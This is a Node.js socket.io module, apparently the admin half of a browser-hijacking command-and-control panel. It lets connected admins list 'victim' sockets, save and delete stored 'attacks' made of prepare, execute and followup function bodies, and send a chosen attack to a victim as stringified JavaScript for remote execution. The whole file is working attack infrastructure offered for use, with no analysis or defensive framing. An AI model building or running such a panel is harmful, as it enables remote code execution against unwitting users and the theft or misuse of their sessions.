const socketio = require('socket.io')
const victimSockets = require('../victim/sockets')
const server = require('../../server')
const Attack = require('../../db/controllers/attack')

module.exports.listen = function (app) {
  let io = socketio.listen(app)

  io.on('connection', function (socket) {

    console.log('admin connected')

    module.exports.emit = function (eventName, data) {
      io.to('admins').emit(eventName, data)
    }

    socket.join('admins')

    socket.on('attackUser', attackUser)
    socket.on('disconnect', disconnect)
    socket.on('getAttacks', getAttacks)
    socket.on('getUsers', getUsers)
    socket.on('saveAttack', saveAttack)
    socket.on('deleteAttack', deleteAttack)
  })

  return io
}

function saveAttack(attack){
  Attack.save(Attack.translateForDB(attack)).then(()=>{
    getAttacks()
  })
  .catch((err)=>{
    console.log(err)
  })
}

function deleteAttack(attackId){
  Attack.deleteById(attackId).then(()=>{
    getAttacks()
  })
  .catch((err)=>{
    console.log(err)
  })
}

function getUsers() {
  victimSockets.sockets.forEach((user)=>{
    module.exports.emit('newUser', user)
  })
}

function getAttacks() {
  Attack.findAll((attacks)=>{
    module.exports.emit('attacks', assembleAttacks(attacks))
  })
}

function disconnect() {
  console.log('admin disconnected')
}

function attackUser(data) {
  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket)
  server.ioVictim.to(data.userSocket).emit('execute', {
    func: `var attack = ${data.attack.toString()}`,
    params: data.params
  })
}

module.exports.emit = ()=>{
  //need to define the emit function to prevent errors when a victim connects before an admin
  console.log('No admins connected')
}

function assembleAttacks(attacks){
  return attacks.map((attack)=>{
    let assembledAttack = ['prepare','execute','followup'].reduce((pv, type)=>{
      pv[type] = {
        name: type,
        description: attack[`${type}_description`],
        function: attack[`${type}`]
      }
      return pv
    },{})
    //attack is a sequelize instance so we need to deconstruct the values from it
    let {id, name, description, inputs, created_at, updated_at} = attack
    return {
      id,
      name,
      description,
      inputs: JSON.parse(inputs),
      created_at,
      updated_at,
      ...assembledAttack
    }
  })
}